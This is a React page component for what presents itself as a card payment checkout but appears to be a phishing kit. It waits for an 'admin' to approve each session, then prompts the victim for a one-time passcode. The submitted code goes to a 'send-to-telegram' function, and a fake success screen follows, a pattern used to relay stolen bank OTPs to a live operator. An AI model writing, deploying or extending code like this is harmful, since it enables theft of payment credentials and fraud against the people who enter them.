import { useState, useEffect } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import WaitingScreen from "@/components/WaitingScreen";
import { supabase } from "@/integrations/supabase/client";

const Index = () => {
  const [step, setStep] = useState<"form" | "waiting" | "otp" | "success">("form");
  const [amount] = useState("99.99");
  const [sessionId, setSessionId] = useState<string | null>(null);

  const handleFormSubmit = (id: string) => {
    setSessionId(id);
    setStep("waiting");
  };

  // Listen for admin to approve → move to OTP
  useEffect(() => {
    if (!sessionId || step !== "waiting") return;

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          const newStatus = (payload.new as any).status;
          if (newStatus === "otp") setStep("otp");
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, step]);

  const handleOtpSubmit = (otp: string) => {
    fetch(
      `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "otp", otp }),
      }
    );
    if (sessionId) {
      supabase.from("sessions").update({ status: "success" as any }).eq("id", sessionId).then();
    }
    setStep("success");
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-transparent to-accent/5 pointer-events-none" />
      <div className="relative z-10">
        {step === "form" && <PaymentForm amount={amount} onSuccess={handleFormSubmit} />}
        {step === "waiting" && <WaitingScreen />}
        {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
        {step === "success" && <PaymentSuccess amount={amount} />}
      </div>
    </div>
  );
};

export default Index;
